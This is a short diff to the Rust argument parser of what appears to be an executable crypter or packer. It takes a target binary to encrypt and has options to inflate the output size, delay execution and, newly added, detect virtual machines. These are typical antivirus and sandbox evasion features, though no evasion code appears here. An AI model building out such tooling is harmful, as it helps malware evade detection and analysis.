@@ -10,21 +10,29 @@ use std::path::PathBuf;
     disable_help_subcommand = true
 )]
 pub struct Args {
-    /// Target binary to process
+    // Target binary to process
     #[arg(value_name = "target-binary")]
     pub encrypt: Option<PathBuf>,
 
-    /// Output file path
+    // Output file path
     #[arg(short = 'o', long, value_name = "output-binary", default_value = "result.exe")]
     pub output: PathBuf,
 
-    /// Increase output size in MiB
+    // Increase output size in MiB
     #[arg(short = 's', long, value_name = "size-in-mb", default_value_t = 0)]
     pub add_size: u64,
 
-    /// Processing delay in seconds
+    // Processing delay in seconds
     #[arg(short = 'd', long, value_name = "seconds", default_value_t = 101)]
     pub delay: u64,
+
+    // verbose output
+    #[arg(short = 'v', long, value_name = "verbose", default_value_t = true)]
+    pub verbose: bool,
+
+    // Enable or disable VM detection
+    #[arg(short = 'm', long, value_name = "vm-detection", default_value_t = true)]
+    pub vm_detection: bool,
 }
 
 pub fn parser() -> Args {
